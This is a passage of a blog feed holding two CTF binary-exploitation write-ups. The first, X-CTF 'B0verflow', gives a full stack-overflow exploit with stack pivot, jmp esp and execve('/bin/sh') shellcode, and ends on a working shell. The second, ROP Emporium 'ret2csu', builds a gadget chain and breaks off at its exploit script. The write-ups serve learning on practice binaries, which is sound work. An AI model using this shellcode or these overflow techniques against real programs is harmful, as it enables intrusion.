&lt;/code>&lt;/pre></content></item><item><title>X-CTF 2016 :: B0verflow</title><link>https://anvbis.github.io/posts/xctf-2016-b0verflow/</link><pubDate>Fri, 13 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/xctf-2016-b0verflow/</guid><description>Reverse Engineering Let&amp;rsquo;s begin by using the file command to get a little insight into this executable. Note that it is a 32-bit linux binary.
$ file ./b0verflow ./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped We can also use checksec to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Let&amp;rsquo;s begin by using the &lt;code>file&lt;/code> command to get a little insight into this executable. Note that it is a 32-bit linux binary.&lt;/p>
&lt;pre>&lt;code>$ file ./b0verflow
./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
&lt;/code>&lt;/pre>&lt;p>We can also use &lt;code>checksec&lt;/code> to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.&lt;/p>
&lt;pre>&lt;code>$ checksec ./b0verflow
[*] './b0verflow'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x8048000)
RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;p>Running the binary reveals that it at some point prompts us for user input. This is likely where we&amp;rsquo;ll find a vulnerability (perhaps it reads to much data in).&lt;/p>
&lt;pre>&lt;code>$ ./b0verflow
======================
Welcome to X-CTF 2016!
======================
What's your name?
anvbis
Hello anvbis
.
&lt;/code>&lt;/pre>&lt;p>Disassembling the &lt;code>main&lt;/code> function reveals that it calls a function &lt;code>vul&lt;/code>. We&amp;rsquo;ll want to investigate this function next, I get the feeling it&amp;rsquo;s vulnerable.&lt;/p>
&lt;pre>&lt;code>int main (int argc, char **argv, char **envp);
0x0804850e push ebp
0x0804850f mov ebp, esp
0x08048511 and esp, 0xfffffff0
0x08048514 call vul ; sym.vul
0x08048519 leave
0x0804851a ret
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>vul&lt;/code> function shows that it reads in 0x32 bytes from stdin, and stores them at a pointer &lt;code>*s&lt;/code>. However, we can see that no memory (beyond the size of the pointer itself) is allocated on the stack at this address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined4 &lt;span style="color:#a6e22e">vul&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">======================&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Welcome to X-CTF 2016!&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">======================&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;What&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">s your name?&amp;#34;&lt;/span>);
fflush(_reloc.stdout);
fgets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s, &lt;span style="color:#ae81ff">0x32&lt;/span>, _reloc.stdin);
printf(&lt;span style="color:#e6db74">&amp;#34;Hello %s.&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
fflush(_reloc.stdout);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We&amp;rsquo;ve found our stack buffer overflow.&lt;/p>
&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Next, let&amp;rsquo;s find where the return address is relative to our input buffer. Note that the &lt;code>vul&lt;/code> function doesn&amp;rsquo;t read many bytes in (only 0x32) so hopefully this is enough to reach the return address.&lt;/p>
&lt;p>Here&amp;rsquo;s a simple script that attaches the process to GDB and sends a cyclic pattern of 100 bytes that we can use to determine the return address' offset.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./b0verflow&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">100&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can continue in GDB and watch the process crash when it tries to return to our garbage data. See the top of the stack below, it seems we can only write about 9 bytes past the return address, this will complicate our exploit.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/4x $esp
0xff93cf20: 0x6161616b 0x6161616c 0x0000006d 0xf7de4e46
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s print out the value of &lt;code>$eip&lt;/code> and use pwntools' &lt;code>cyclic_find&lt;/code> function to find the offset. It appears that &lt;code>$eip&lt;/code> is 36 bytes after the start of our input buffer.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; p $eip
$1 = (void (*)()) 0x6161616a
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616a&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">36&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So, now we need to solve the limited space issue (9 bytes is not enough space to store a complex ROP chain). Let&amp;rsquo;s use the &lt;code>ropper&lt;/code> tool to see if we can find any gadgets to pivot our stack.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./b0verflow --stack-pivot
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
Gadgets
=======
0x08048609: add esp, 0x1c; pop ebx; pop esi; pop edi; pop ebp; ret;
0x0804837e: add esp, 8; pop ebx; ret;
0x0804847e: ret 0xeac1;
0x08048500: sub esp, 0x24; ret;
4 gadgets found
&lt;/code>&lt;/pre>&lt;p>The gadget that I immediately noticed was &lt;code>sub esp, 0x24; ret&lt;/code>, this will allow us to move the stack almost all the way to the start of our input buffer (about 4 bytes into our input buffer, to be exact).&lt;/p>
&lt;pre>&lt;code>0x08048500: sub esp, 0x24; ret;
&lt;/code>&lt;/pre>&lt;p>Now we just need something like a &lt;code>jmp esp&lt;/code> or a &lt;code>mov eax, esp; jmp eax&lt;/code> gadget to direct process execution to our shellcode. Using &lt;code>ropper&lt;/code> again, we immediately find a &lt;code>jmp esp&lt;/code> instruction.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./b0verflow --search 'jmp esp' 130 ⨯
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp
[INFO] File: ./b0verflow
0x08048504: jmp esp;
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have all the information we need, we can start developing our exploit.&lt;/p>
&lt;p>Let&amp;rsquo;s write some shellcode. We only have a limited amount of space to store it (about 32 bytes), so I&amp;rsquo;ve used various techniques (such as using &lt;code>xor&lt;/code> to set registers to &lt;code>0&lt;/code>) to reduce the size of the shellcode.&lt;/p>
&lt;pre>&lt;code>.global _start
_start:
.intel_syntax noprefix
shell:
push 0x0068732f # &amp;quot;/sh&amp;quot;
push 0x6e69622f # &amp;quot;/bin&amp;quot;
mov ebx, esp # &amp;quot;/bin/sh&amp;quot;
xor ecx, ecx
xor edx, edx
mov al, 11
int 0x80 # execve(&amp;quot;/bin/sh&amp;quot;)
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
&lt;/code>&lt;/pre>&lt;p>After compilation, we can see that our shellcode is only 20 bytes long, very nice.&lt;/p>
&lt;pre>&lt;code>08049000 &amp;lt;_start&amp;gt;:
8049000: 68 2f 73 68 00 push $0x68732f
8049005: 68 2f 62 69 6e push $0x6e69622f
804900a: 89 e3 mov %esp,%ebx
804900c: 31 c9 xor %ecx,%ecx
804900e: 31 d2 xor %edx,%edx
8049010: b0 0b mov $0xb,%al
8049012: cd 80 int $0x80
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">1&lt;/span>]: open(&lt;span style="color:#e6db74">&amp;#39;payload&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
Out[&lt;span style="color:#ae81ff">1&lt;/span>]: &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xc9&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
In [&lt;span style="color:#ae81ff">2&lt;/span>]: len(open(&lt;span style="color:#e6db74">&amp;#39;payload&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read())
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">20&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can write our final exploit. Note that we need to add the address to the &lt;code>jmp esp&lt;/code> gadget 4 bytes after the start of our input buffer (as this is where the program will attempt to get the next return address after our stack pivot).&lt;/p>
&lt;p>Here&amp;rsquo;s an overview of what we want to achieve:&lt;/p>
&lt;ul>
&lt;li>Pivot our stack with the &lt;code>sub esp, 0x24; ret&lt;/code> gadget.&lt;/li>
&lt;li>Jump to &lt;code>$esp&lt;/code>, where our shellcode is stored.&lt;/li>
&lt;li>Get shellcode execution.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x08048504: jmp esp;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
jmp_esp &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0x08048504&lt;/span>)
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x08048500: sub esp, 0x24; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
sub_esp &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0x08048500&lt;/span>)
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xc9&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
lpad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
rpad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#ae81ff">36&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(buf) &lt;span style="color:#f92672">-&lt;/span> len(jmp_esp) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./b0verflow&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(lpad &lt;span style="color:#f92672">+&lt;/span> jmp_esp &lt;span style="color:#f92672">+&lt;/span> buf &lt;span style="color:#f92672">+&lt;/span> rpad &lt;span style="color:#f92672">+&lt;/span> sub_esp)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './b0verflow': pid 2328
[*] Switching to interactive mode
$ cat flag.txt
X-CTF{b0verflow}
$
[*] Stopped process './b0verflow' (pid 2328)
&lt;/code>&lt;/pre></content></item><item><title>ROP Emporium :: Ret2csu</title><link>https://anvbis.github.io/posts/rop-emporium-ret2csu/</link><pubDate>Thu, 12 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/rop-emporium-ret2csu/</guid><description>Reverse Engineering Let&amp;rsquo;s run the file command to get a brief overview of the binary. Note that it is a 64-bit linux executable.
$ file ./ret2csu ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped We can also run checksec against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Let&amp;rsquo;s run the &lt;code>file&lt;/code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
&lt;/code>&lt;/pre>&lt;p>We can also run &lt;code>checksec&lt;/code> against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection. We can also see that the NX bit is enabled, so we can&amp;rsquo;t execute shellcode.&lt;/p>
&lt;pre>&lt;code>$ checksec ./ret2csu
[*] './ret2csu'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
RUNPATH: b'.'
&lt;/code>&lt;/pre>&lt;p>Running the executable shows us that it at some point takes user input. This is likely where we&amp;rsquo;ll be able to find some vulnerability.&lt;/p>
&lt;pre>&lt;code>$ ./ret2csu
ret2csu by ROP Emporium
x86_64
Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
&amp;gt; hello
Thank you!
&lt;/code>&lt;/pre>&lt;p>After a tiny bit of reverse engineering, we see this &lt;code>pwnme&lt;/code> function called by &lt;code>main&lt;/code>. We can see that it allocates 0x20 bytes of memory for a buffer &lt;code>buf&lt;/code>, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">pwnme&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf;
setvbuf(&lt;span style="color:#f92672">*&lt;/span>_reloc.stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xc88&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xca0&lt;/span>);
memset(&lt;span style="color:#f92672">&amp;amp;&lt;/span>buf, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x20&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xca8&lt;/span>);
printf(&lt;span style="color:#ae81ff">0xd12&lt;/span>);
read(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buf, &lt;span style="color:#ae81ff">0x200&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xd15&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Further investigation reveals that there is a function called &lt;code>ret2win&lt;/code>. Another function &lt;code>usefulFunction&lt;/code> appears to call &lt;code>ret2win&lt;/code> with the parameters &lt;code>ret2win(0x3, 0x2, 0x1)&lt;/code>. We&amp;rsquo;ll want to investigate this function further.&lt;/p>
&lt;pre>&lt;code>0x00400510 1 6 sym.imp.ret2win
&lt;/code>&lt;/pre>&lt;pre>&lt;code>0x000000000040061b &amp;lt;+4&amp;gt;: mov edx,0x3
0x0000000000400620 &amp;lt;+9&amp;gt;: mov esi,0x2
0x0000000000400625 &amp;lt;+14&amp;gt;: mov edi,0x1
0x000000000040062a &amp;lt;+19&amp;gt;: call 0x400510 &amp;lt;ret2win@plt&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>ret2win&lt;/code> function reveals that it will immediately call &lt;code>exit&lt;/code> if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in &lt;code>encrypted_flag.dat&lt;/code>.&lt;/p>
&lt;p>The correct parameters are as follows:&lt;/p>
&lt;ul>
&lt;li>&lt;code>$rdi = 0xdeadbeefdeadbeef&lt;/code>.&lt;/li>
&lt;li>&lt;code>$rsi = 0xcafebabecafebabe&lt;/code>.&lt;/li>
&lt;li>&lt;code>$rdx = 0xd00df00dd00df00d&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>So we have to find some way to set all of these registers to their correct values before calling the &lt;code>ret2win&lt;/code> function in order to get the flag.&lt;/p>
&lt;pre>&lt;code> 0x000009ef 48b8efbeadde. movabs rax, 0xdeadbeefdeadbeef
0x000009f9 483945e8 cmp qword [var_18h], rax
┌─&amp;lt; 0x000009fd 0f85d7000000 jne 0xada
│ 0x00000a03 48b8bebafeca. movabs rax, 0xcafebabecafebabe
│ 0x00000a0d 483945e0 cmp qword [var_20h], rax
┌──&amp;lt; 0x00000a11 0f85c3000000 jne 0xada
││ 0x00000a17 48b80df00dd0. movabs rax, 0xd00df00dd00df00d
││ 0x00000a21 483945d8 cmp qword [var_28h], rax
┌───&amp;lt; 0x00000a25 0f85af000000 jne 0xada
│││ 0x00000a2b 488d35ee0200. lea rsi, [0x00000d20]
│││ 0x00000a32 488d3de90200. lea rdi, str.encrypted_flag.dat
│││ 0x00000a39 e8f2fdffff call sym.imp.fopen
...
│││
└└└─&amp;gt; 0x00000ada 488d3d930200. lea rdi, str.Incorrect_parameters
0x00000ae1 e8bafcffff call sym.imp.puts ; int puts(const char *s)
0x00000ae6 bf01000000 mov edi, 1 ; int status
0x00000aeb e850fdffff call sym.imp.exit ; void exit(int status)
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>First, let&amp;rsquo;s find the offset of the return address from where our input buffer is stored in the &lt;code>pwnme&lt;/code> function.&lt;/p>
&lt;p>We&amp;rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">200&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function we can get the offset from the start of our input buffer to the return address stored on the stack.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616166&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next let&amp;rsquo;s figure out how we can store a value in the &lt;code>$rdx&lt;/code> register. We&amp;rsquo;re able to store values in the &lt;code>$rdi&lt;/code> and &lt;code>$rsi&lt;/code> registers quite easily (they have &lt;code>pop; ret&lt;/code> gadgets we can easily use).&lt;/p>
&lt;p>After digging around the &lt;code>__libc_csu_init&lt;/code> function, we find two interesting looking gadgets, see below (I&amp;rsquo;ve added some comments for clarity).&lt;/p>
&lt;p>Note that we can use the first gadget to set the values of &lt;code>$rsi&lt;/code> and &lt;code>$rdx&lt;/code>.&lt;/p>
&lt;pre>&lt;code>0x00400680 4c89fa mov rdx, r15
0x00400683 4c89f6 mov rsi, r14
0x00400686 4489ef mov edi, r13d
0x00400689 41ff14dc call qword [r12 + rbx*8]
0x0040068d 4883c301 add rbx, 1
0x00400691 4839dd cmp rbp, rbx
0x00400694 75ea jne 0x400680
&lt;/code>&lt;/pre>&lt;pre>&lt;code>0x0040069a 5b pop rbx ; set to 0
0x0040069b 5d pop rbp ; set to 1 to bypass check after call
0x0040069c 415c pop r12 ; set to pointer to useless function
0x0040069e 415d pop r13
0x004006a0 415e pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2 415f pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4 c3 ret
&lt;/code>&lt;/pre>&lt;p>It&amp;rsquo;ll be a little complex, but we should be able to use these to get the values we want into our target registers.&lt;/p>
&lt;p>We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers).&lt;/p>
&lt;p>Note the &lt;code>call qword [r12 + rbx*8]&lt;/code> instruction. As it dereferences a pointer to a function, we can&amp;rsquo;t use this to redirect execution.&lt;/p>
&lt;pre>&lt;code>0x00400686 4489ef mov edi, r13d
0x00400689 41ff14dc call qword [r12 + rbx*8]
0x0040068d 4883c301 add rbx, 1
&lt;/code>&lt;/pre>&lt;p>Instead we&amp;rsquo;ll have to find a pointer to some function that doesn&amp;rsquo;t change anything, as to not ruin the values stored in our target registers. We&amp;rsquo;ll just pass by this call and head to the &lt;code>ret&lt;/code> instruction below.&lt;/p>
&lt;p>Let&amp;rsquo;s take a look at the functions stored in the binary, and see if we can find any pointers to them.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info functions
All defined functions:
Non-debugging symbols:
0x00000000004004d0 _init
0x0000000000400500 pwnme@plt
0x0000000000400510 ret2win@plt
0x0000000000400520 _start
0x0000000000400550 _dl_relocate_static_pie
0x0000000000400560 deregister_tm_clones
0x0000000000400590 register_tm_clones
0x00000000004005d0 __do_global_dtors_aux
0x0000000000400600 frame_dummy
0x0000000000400607 main
0x0000000000400617 usefulFunction
0x0000000000400640 __libc_csu_init
0x00000000004006b0 __libc_csu_fini
0x00000000004006b4 _fini
&lt;/code>&lt;/pre>&lt;p>Using &lt;code>objdump&lt;/code> and &lt;code>grep&lt;/code> we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.&lt;/p>
&lt;p>The address that immediately jumps out to me is &lt;code>0x4003af&lt;/code>, which contains the bytes for the &lt;code>_fini&lt;/code> function, a suitably inert function.&lt;/p>
&lt;pre>&lt;code>$ objdump -D ret2csu | grep '06 40' -B 1
4003ad: 00 0e add %cl,(%rsi)
4003af: 00 b4 06 40 00 00 00 add %dh,0x40(%rsi,%rax,1)
--
40052e: 54 push %rsp
40052f: 49 c7 c0 b0 06 40 00 mov $0x4006b0,%r8
400536: 48 c7 c1 40 06 40 00 mov $0x400640,%rcx
40053d: 48 c7 c7 07 06 40 00 mov $0x400607,%rdi
--
600e45: 00 00 add %al,(%rax)
600e47: 00 b4 06 40 00 00 00 add %dh,0x40(%rsi,%rax,1)
&lt;/code>&lt;/pre>&lt;p>We can look this up in GDB to be sure (adding 1 to align the address correctly).&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/x (0x4003af + 1)
0x4003b0: 0x00000000004006b4
&lt;/code>&lt;/pre>&lt;p>Now we can use the &lt;code>ropper&lt;/code> tool to find a gadget to set the value of &lt;code>$rdi&lt;/code>. Surprise, surprise, we immediately find one.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./ret2csu --search '% rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi
[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>We have all the information we need, so let&amp;rsquo;s start building our exploit. Here&amp;rsquo;s an outline of what we want to achieve:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address in the &lt;code>pwnme&lt;/code> function.&lt;/li>
&lt;li>Store the values &lt;code>0xcafebabecafebabe&lt;/code> and &lt;code>0xd00df00dd00df00d&lt;/code> in the &lt;code>$rsi&lt;/code> and &lt;code>$rdx&lt;/code> registers.&lt;/li>
&lt;li>Store the value &lt;code>0xdeadbeefdeadbeef&lt;/code> in the &lt;code>$rdi&lt;/code> register.&lt;/li>
&lt;li>Call the &lt;code>ret2win&lt;/code> function with the above values.&lt;/li>
&lt;/ul>
&lt;p>Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values &lt;code>$rbp = 1&lt;/code> and &lt;code>$rbx = 0&lt;/code>.&lt;/p>
&lt;p>We also have to pad out the stack so that the &lt;code>pop&lt;/code> instructions after the call don&amp;rsquo;t destroy our rop chain.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
